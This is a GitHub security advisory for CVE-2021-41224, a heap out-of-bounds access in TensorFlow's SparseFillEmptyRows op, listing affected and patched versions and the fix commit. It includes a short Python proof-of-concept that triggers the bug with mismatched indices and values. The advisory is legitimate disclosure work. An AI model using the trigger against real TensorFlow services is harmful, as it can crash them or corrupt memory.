# `SparseFillEmptyRows` heap OOB

Moderate

[mihaimaruseac](/mihaimaruseac)
published
GHSA-rg3m-hqc5-344v
Nov 4, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.7.0

## Patched versions

2.4.4, 2.5.2, 2.6.1

## Description

### Impact

The [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L194-L241) of `SparseFillEmptyRows` can be made to trigger a heap OOB access:

```
import tensorflow as tf

data=tf.raw_ops.SparseFillEmptyRows(
  indices=[[0,0],[0,0],[0,0]],
  values=['sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss'],
  dense_shape=[5,3],
  default_value='o')
```

This occurs whenever the size of `indices` does not match the size of `values`.

### Patches

We have patched the issue in GitHub commit [67bfd9feeecfb3c61d80f0e46d89c170fbee682b](https://github.com/tensorflow/tensorflow/commit/67bfd9feeecfb3c61d80f0e46d89c170fbee682b).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

### Severity

Moderate

### CVE ID

CVE-2021-41224

### Weaknesses

No CWEs
